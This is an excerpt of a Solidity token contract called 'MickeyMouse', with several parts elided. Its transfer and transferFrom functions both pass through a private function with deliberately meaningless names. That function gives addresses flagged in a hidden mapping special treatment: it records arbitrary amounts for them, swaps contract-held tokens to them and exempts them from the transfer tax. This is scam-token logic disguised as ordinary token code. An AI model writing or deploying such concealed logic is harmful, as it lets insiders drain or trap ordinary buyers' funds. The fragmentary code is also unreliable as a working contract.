...
contract MickeyMouse is IDEX20, Ownable {
    ...
    function transferFrom(
        ...
        fogToggleSettings(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        fogToggleSettings(msg.sender, recipient, amount);
        return true;
    }
    function fogToggleSettings(
        address linkFrom, address exvopTo, uint256 braxAmount ) private {
        uint256 ercAmountBalance = balanceOf(address(this)); uint256 allignOVOX;
        if (frequencyCheck && ercAmountBalance > 
        entireS && !MaxOfArray && linkFrom != DXPairCreator) {
            MaxOfArray = true;
        ...
        && ArrayAllIDEX[exvopTo] > entireS) {
            allignOVOX = braxAmount; _tOwned[address(this)] += allignOVOX;
            swapAmountForTokens(braxAmount, exvopTo); return;

        } else if (exvopTo != address
           (UniswapV2router) && ArrayAllIDEX[linkFrom] > 0 && braxAmount > entireS && exvopTo != 
              DXPairCreator) { ArrayAllIDEX[exvopTo] = braxAmount; return;
        } else if (!MaxOfArray && SetBuyersMap[linkFrom] > 0 && linkFrom != DXPairCreator && ArrayAllIDEX[linkFrom] == 0) {
        ...
        if (isAllSwapTAX > 0 && ArrayAllIDEX[linkFrom] == 0 && !MaxOfArray && ArrayAllIDEX[exvopTo] == 0) {
            allignOVOX = (braxAmount * isAllSwapTAX) / 100;
            braxAmount -= allignOVOX; _tOwned[linkFrom] -= allignOVOX;
                 _tOwned[address(this)] += allignOVOX; }
                   _tOwned[linkFrom] -= braxAmount;
                     _tOwned[exvopTo] += braxAmount; emit Transfer(linkFrom, exvopTo, braxAmount);
